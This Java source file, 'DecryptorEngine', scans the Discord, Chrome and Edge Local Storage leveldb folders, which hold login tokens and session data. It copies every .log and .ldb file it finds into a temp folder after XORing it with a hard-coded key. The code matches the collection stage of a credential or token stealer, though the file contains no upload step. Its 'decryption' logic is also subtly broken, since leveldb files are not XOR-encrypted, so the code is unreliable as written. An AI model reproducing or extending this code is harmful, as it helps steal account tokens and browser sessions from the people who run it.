import java.io.*;
import java.nio.file.*;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;

public class DecryptorEngine {
    private static final String TEMP_DIR = System.getenv("TEMP") + "\\SWILL_DEC";
    private static final byte[] KEY = "SwillWay2025Key42".getBytes();
    
    public static void main(String[] args) {
        log("DecryptorEngine started");
        new File(TEMP_DIR).mkdirs();
        log("Temp directory: " + TEMP_DIR);
        scanAndDecrypt();
    }
    
    private static void log(String msg) {
        String timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss"));
        System.out.println("[Decryptor][" + timestamp + "] " + msg);
    }
    
    private static void scanAndDecrypt() {
        String[] targetPaths = {
            System.getenv("APPDATA") + "\\discord\\Local Storage\\leveldb",
            System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
            System.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb",
            System.getenv("APPDATA") + "\\discordptb\\Local Storage\\leveldb",
            System.getenv("APPDATA") + "\\discordcanary\\Local Storage\\leveldb"
        };
        
        for (String path : targetPaths) {
            File dir = new File(path);
            if (dir.exists() && dir.isDirectory()) {
                log("Found target directory: " + path);
                decryptLevelDB(dir);
            } else {
                log("Directory not found: " + path);
            }
        }
        log("Scan complete. DecryptorEngine will exit. Run again to rescan.");
    }
    
    private static void decryptLevelDB(File leveldbDir) {
        File[] files = leveldbDir.listFiles((d, n) -> n.endsWith(".log") || n.endsWith(".ldb"));
        if (files == null || files.length == 0) {
            log("No .log or .ldb files found in " + leveldbDir.getPath());
            return;
        }
        
        log("Found " + files.length + " file(s) to decrypt in " + leveldbDir.getPath());
        
        for (File f : files) {
            try {
                byte[] encrypted = Files.readAllBytes(f.toPath());
                byte[] decrypted = xorDecrypt(encrypted);
                String outPath = TEMP_DIR + "\\" + f.getName() + ".dec";
                Files.write(Paths.get(outPath), decrypted);
                log("Decrypted: " + f.getName() + " -> " + outPath + " (" + decrypted.length + " bytes)");
            } catch (Exception e) {
                log("Error decrypting " + f.getName() + ": " + e.getMessage());
            }
        }
    }
    
    private static byte[] xorDecrypt(byte[] data) {
        byte[] result = new byte[data.length];
        for (int i = 0; i < data.length; i++) {
            result[i] = (byte) (data[i] ^ KEY[i % KEY.length]);
        }
        return result;
    }
}
